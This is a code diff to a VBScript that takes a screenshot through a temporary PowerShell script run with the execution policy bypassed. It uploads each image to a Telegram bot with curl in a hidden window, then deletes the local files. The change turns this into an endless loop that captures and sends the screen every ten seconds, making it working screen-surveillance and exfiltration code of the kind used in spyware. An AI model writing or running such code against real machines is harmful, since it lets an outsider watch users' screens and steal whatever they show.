@@ -28,36 +28,43 @@ powershell_script = "$ScreenshotPath = '" & screenshotFilePath & "'" & vbCrLf & 
 ' Define the file path for the PowerShell script
 temp_ps_file = script_directory & "\temp_screenshot.ps1"
 
-' Save the PowerShell script to a temporary file
-Set objFile = objFSO.CreateTextFile(temp_ps_file, True)
-objFile.WriteLine powershell_script
-objFile.Close
+' Infinite loop to take a screenshot every 10 seconds
+Do
+    ' Save the PowerShell script to a temporary file
+    Set objFile = objFSO.CreateTextFile(temp_ps_file, True)
+    objFile.WriteLine powershell_script
+    objFile.Close
 
-' Execute PowerShell script with visibility and wait for completion
-objShell.Run "powershell -ExecutionPolicy Bypass -File """ & temp_ps_file & """", 1, True
+    ' Execute PowerShell script with visibility and wait for completion
+    objShell.Run "powershell -ExecutionPolicy Bypass -File """ & temp_ps_file & """", 1, True
 
-' Wait for the screenshot to be saved
-WScript.Sleep 3000
+    ' Wait for the screenshot to be saved
+    WScript.Sleep 3000
 
-' Check if the screenshot file exists
-If objFSO.FileExists(screenshotFilePath) Then
-    ' Send the screenshot to Telegram using curl instead of XMLHTTP
-    curlCommand = "curl -F ""chat_id=" & chat_id & """ -F ""photo=@" & screenshotFilePath & """ https://api.telegram.org/bot" & telegram_token & "/sendPhoto"
-    objShell.Run "cmd /c " & curlCommand, 0, True
-    
-    ' Wait for Telegram to process the request
-    WScript.Sleep 2000
-    
-    ' Delete the screenshot file after sending it
+    ' Check if the screenshot file exists
     If objFSO.FileExists(screenshotFilePath) Then
-        objFSO.DeleteFile screenshotFilePath
+        ' Send the screenshot to Telegram using curl instead of XMLHTTP
+        curlCommand = "curl -F ""chat_id=" & chat_id & """ -F ""photo=@" & screenshotFilePath & """ https://api.telegram.org/bot" & telegram_token & "/sendPhoto"
+        objShell.Run "cmd /c " & curlCommand, 0, True
+        
+        ' Wait for Telegram to process the request
+        WScript.Sleep 2000
+        
+        ' Delete the screenshot file after sending it
+        If objFSO.FileExists(screenshotFilePath) Then
+            objFSO.DeleteFile screenshotFilePath
+        End If
+        
+        MsgBox "Screenshot sent successfully!"
+    Else
+        MsgBox "Screenshot file was not created. Please check your script."
     End If
-    
-Else
-    MsgBox "Screenshot file was not created. Please check your script."
-End If
 
-' Clean up and delete the temporary PowerShell script
-If objFSO.FileExists(temp_ps_file) Then
-    objFSO.DeleteFile temp_ps_file
-End If
+    ' Clean up and delete the temporary PowerShell script
+    If objFSO.FileExists(temp_ps_file) Then
+        objFSO.DeleteFile temp_ps_file
+    End If
+
+    ' Wait for 10 seconds before taking another screenshot
+    WScript.Sleep 10000 ' 10 seconds
+Loop
